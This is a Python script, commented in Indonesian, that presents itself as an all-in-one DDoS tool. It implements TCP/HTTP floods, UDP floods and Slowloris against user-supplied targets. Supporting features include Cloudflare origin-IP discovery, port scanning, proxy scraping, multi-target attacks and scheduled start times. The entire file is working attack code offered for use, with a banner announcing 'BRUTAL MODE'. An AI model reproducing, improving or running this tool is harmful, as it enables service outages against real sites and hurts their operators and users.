#!/usr/bin/env python3
# SCRIPT DDoS ULTIMATE - ALL IN ONE

import socket
import threading
import random
import time
import sys
import requests
import datetime
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
import dns.resolver
import re

# GLOBAL VARIABLES BUAT STATISTIK
packets_sent = 0
bytes_sent = 0
start_time = time.time()
attack_active = True
proxies_list = []
targets = []
open_ports = []

# FUNGSI BUAT GENERATE STRING RANDOM
def random_string(length):
    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choice(letters) for i in range(length))

# FUNGSI AMBIL PROXY
def get_proxies():
    global proxies_list
    print("[*] Ambil proxy dari API...")
    try:
        r = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', timeout=5)
        proxies_list = r.text.strip().split('\r\n')
        print(f"[+] Dapet {len(proxies_list)} proxy")
        return proxies_list
    except Exception as e:
        print(f"[-] Gagal ambil proxy: {e}")
        return []

# FUNGSI SCAN PORT
def scan_ports(ip, start_port=1, end_port=1024):
    global open_ports
    print(f"[*] Scan port {ip} dari {start_port}-{end_port}...")
    open_ports = []
    
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"[+] Port {port} terbuka")
            sock.close()
        except:
            pass
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(scan_port, range(start_port, end_port+1))
    
    print(f"[+] Selesai scan. Dapet {len(open_ports)} port terbuka")
    return open_ports

# FUNGSI BYPASS CLOUDFLARE
def get_real_ip(domain):
    print(f"[*] Cari IP asli dari {domain}...")
    
    # Method 1: DNS lookup biasa
    try:
        answers = dns.resolver.resolve(domain, 'A')
        for rdata in answers:
            ip = str(rdata)
            print(f"[+] DNS A record: {ip}")
            return ip
    except:
        pass
    
    # Method 2: Cek history DNS
    try:
        r = requests.get(f"https://viewdns.info/iphistory/?domain={domain}", timeout=5)
        ips = re.findall(r'\d+\.\d+\.\d+\.\d+', r.text)
        unique_ips = list(set(ips))
        if unique_ips:
            print(f"[+] Dapet dari history: {unique_ips[0]}")
            return unique_ips[0]
    except:
        pass
    
    # Method 3: Cek subdomain
    try:
        subdomains = ['direct', 'origin', 'cdn', 'static', 'mail', 'ftp', 'ssh']
        for sub in subdomains:
            try:
                answers = dns.resolver.resolve(f"{sub}.{domain}", 'A')
                for rdata in answers:
                    ip = str(rdata)
                    print(f"[+] Subdomain {sub}: {ip}")
                    return ip
            except:
                continue
    except:
        pass
    
    print("[-] Gagal dapet IP asli, pake domain aja")
    return domain

# FUNGSI ATTACK TCP
def attack_tcp(ip, port):
    global packets_sent, bytes_sent
    while attack_active:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            
            # Random payload
            request = f"GET /{random_string(10)}.php?{random_string(5)}={random.randint(1000,9999)} HTTP/1.1\r\n"
            request += f"Host: {ip}\r\n"
            request += f"User-Agent: {random.choice(['Mozilla/5.0', 'GoogleBot', 'Chrome/120', 'Safari/537.36', 'Edge/120', 'Firefox/120'])}\r\n"
            request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            request += f"Accept-Language: {random.choice(['en-US,en;q=0.9', 'id,en-US;q=0.7,en;q=0.3', 'ja,en;q=0.8'])}\r\n"
            request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
            
            # Pake proxy kalo ada
            if proxies_list and random.choice([True, False]):
                proxy = random.choice(proxies_list)
                request += f"X-Proxy: {proxy}\r\n"
            
            request += "Connection: Keep-Alive\r\n\r\n"
            
            # Kirim banyak request dalam satu koneksi
            for _ in range(random.randint(10, 50)):
                sock.send(request.encode())
                packets_sent += 1
                bytes_sent += len(request)
            
            sock.close()
        except:
            pass

# FUNGSI ATTACK UDP
def attack_udp(ip, port):
    global packets_sent, bytes_sent
    while attack_active:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Random payload besar
            payload = random_string(random.randint(1024, 65500)).encode()
            
            for _ in range(random.randint(10, 30)):
                sock.sendto(payload, (ip, port))
                packets_sent += 1
                bytes_sent += len(payload)
            
            sock.close()
        except:
            pass

# FUNGSI SLOWLORIS
def attack_slowloris(ip, port):
    global packets_sent, bytes_sent
    sockets = []
    
    # Bikin banyak koneksi
    for _ in range(100):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            
            # Kirim header partial
            sock.send(f"GET /{random_string(10)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {ip}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(['Mozilla/5.0', 'GoogleBot'])}\r\n".encode())
            # Jangan kirim \r\n terakhir biar koneksi menggantung
            
            sockets.append(sock)
            packets_sent += 3
        except:
            pass
    
    print(f"[+] Slowloris: {len(sockets)} koneksi menggantung")
    
    # Jaga koneksi tetap hidup
    while attack_active and sockets:
        for sock in sockets[:]:
            try:
                sock.send(f"X-{random_string(5)}: {random.randint(1000,9999)}\r\n".encode())
                packets_sent += 1
                bytes_sent += 25
            except:
                sockets.remove(sock)
                try:
                    sock.close()
                except:
                    pass
        
        time.sleep(10)

# FUNGSI SHOW STATISTIK
def show_stats():
    global packets_sent, bytes_sent, start_time
    while attack_active:
        time.sleep(5)
        elapsed = time.time() - start_time
        if elapsed > 0:
            packet_rate = packets_sent / elapsed
            byte_rate = (bytes_sent / 1024) / elapsed
            
            print(f"\r[+] Packet: {packets_sent:,} | Bytes: {bytes_sent/1024/1024:.2f} MB | Rate: {packet_rate:.2f} pkt/s | {byte_rate:.2f} KB/s", end="")

# MAIN PROGRAM
def main():
    global attack_active, targets, proxies_list, open_ports
    
    print("""
    ╔═══════════════════════════════════════╗
    ║     DDoS ULTIMATE - ALL FEATURES      ║
    ║         [ BRUTAL MODE ACTIVE ]        ║
    ╚═══════════════════════════════════════╝
    """)
    
    # PILIH METODE
    print("PILIH METODE SERANGAN:")
    print("1. TCP Flood")
    print("2. UDP Flood")
    print("3. HTTP Flood")
    print("4. Slowloris")
    print("5. ALL METHODS (BRUTAL)")
    print("6. Multi-target")
    
    metode = input("\nPilih (1-6): ").strip()
    
    # TARGET INPUT
    if metode == "6":
        print("\nMASUKIN TARGET (kosongin kalo udah):")
        while True:
            target = input("Target (domain/IP): ").strip()
            if not target:
                break
            targets.append(target)
    else:
        target = input("\nTarget (domain/IP): ").strip()
        targets = [target]
    
    # BYPASS CLOUDFLARE
    bypass = input("\nCoba bypass Cloudflare? (y/n): ").strip().lower()
    if bypass == 'y':
        for i, target in enumerate(targets[:]):
            if not target.replace('.', '').isdigit():
                real_ip = get_real_ip(target)
                if real_ip != target:
                    targets[i] = real_ip
    
    # SCAN PORT
    scan = input("\nScan port dulu? (y/n): ").strip().lower()
    if scan == 'y' and targets:
        port_range = input("Range port (contoh: 1-1024): ").strip()
        try:
            start_port, end_port = map(int, port_range.split('-'))
        except:
            start_port, end_port = 1, 1024
        
        all_ports = []
        for target in targets:
            if not target.replace('.', '').isdigit():
                continue
            ports = scan_ports(target, start_port, end_port)
            all_ports.extend(ports)
        
        if all_ports:
            print(f"\nPort yang ditemukan: {all_ports}")
            pilih_port = input("Pake port tertentu? (y/n): ").strip().lower()
            if pilih_port == 'y':
                port = int(input("Masukin port: ").strip())
                open_ports = [port]
            else:
                open_ports = all_ports
        else:
            port = int(input("\nGak dapet port, masukin manual: ").strip())
            open_ports = [port]
    else:
        port = int(input("\nMasukin port target: ").strip())
        open_ports = [port]
    
    # PROXY
    pake_proxy = input("\nPake proxy? (y/n): ").strip().lower()
    if pake_proxy == 'y':
        proxies_list = get_proxies()
    
    # THREAD COUNT
    thread_count = int(input("\nJumlah thread (recommended: 500-2000): ").strip())
    
    # JADWAL SERANGAN
    jadwal = input("\nJadwal serangan? (y/n): ").strip().lower()
    if jadwal == 'y':
        jam_serang = input("Jam mulai (format HH:MM, 24h): ").strip()
        print(f"[*] Nunggu jam {jam_serang} buat mulai...")
        
        while True:
            now = datetime.datetime.now().strftime("%H:%M")
            if now == jam_serang:
                print(f"[+] WAKTU NYAMPE! MULAI SERANGAN!")
                break
            time.sleep(30)
    
    # MULAI SERANGAN
    print(f"\n[+] MULAI SERANGAN BRUTAL!")
    print(f"[+] Target: {', '.join(map(str, targets))}")
    print(f"[+] Port: {open_ports}")
    print(f"[+] Thread: {thread_count}")
    print(f"[+] Proxy: {len(proxies_list)} available")
    print("[+] Tekan Ctrl+C buat berhenti\n")
    
    # THREAD BUAT STATISTIK
    stats_thread = threading.Thread(target=show_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    # THREAD SERANGAN
    attack_threads = []
    
    if metode == "1":  # TCP aja
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            for target in targets:
                for port in open_ports:
                    futures = [executor.submit(attack_tcp, target, port) for _ in range(thread_count//len(targets)//len(open_ports))]
    
    elif metode == "2":  # UDP aja
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            for target in targets:
                for port in open_ports:
                    futures = [executor.submit(attack_udp, target, port) for _ in range(thread_count//len(targets)//len(open_ports))]
    
    elif metode == "3":  # HTTP aja (pake TCP)
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            for target in targets:
                for port in open_ports:
                    futures = [executor.submit(attack_tcp, target, port) for _ in range(thread_count//len(targets)//len(open_ports))]
    
    elif metode == "4":  # Slowloris
        for target in targets:
            for port in open_ports:
                t = threading.Thread(target=attack_slowloris, args=(target, port))
                t.daemon = True
                t.start()
                attack_threads.append(t)
    
    elif metode == "5" or metode == "6":  # ALL METHODS
        method_count = 4
        per_method = thread_count // method_count
        
        # TCP
        for _ in range(per_method):
            t = threading.Thread(target=attack_tcp, args=(random.choice(targets), random.choice(open_ports)))
            t.daemon = True
            t.start()
            attack_threads.append(t)
        
        # UDP
        for _ in range(per_method):
            t = threading.Thread(target=attack_udp, args=(random.choice(targets), random.choice(open_ports)))
            t.daemon = True
            t.start()
            attack_threads.append(t)
        
        # HTTP (pake TCP juga beda port)
        for _ in range(per_method):
            t = threading.Thread(target=attack_tcp, args=(random.choice(targets), random.choice(open_ports)))
            t.daemon = True
            t.start()
            attack_threads.append(t)
        
        # Slowloris (1 thread per target)
        for target in targets:
            for port in open_ports:
                t = threading.Thread(target=attack_slowloris, args=(target, port))
                t.daemon = True
                t.start()
                attack_threads.append(t)
    
    # JALANIN SAMPE DIINTERRUPT
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        attack_active = False
        print("\n\n[+] SERANGAN DIHENTIKAN!")
        
        # TAMPILIN STATISTIK AKHIR
        elapsed = time.time() - start_time
        print(f"[+] Durasi: {elapsed:.2f} detik")
        print(f"[+] Total Packet: {packets_sent:,}")
        print(f"[+] Total Data: {bytes_sent/1024/1024:.2f} MB")
        if elapsed > 0:
            print(f"[+] Rata-rata: {packets_sent/elapsed:.2f} pkt/s | {(bytes_sent/1024)/elapsed:.2f} KB/s")
        
        sys.exit(0)

if __name__ == "__main__":
    main()
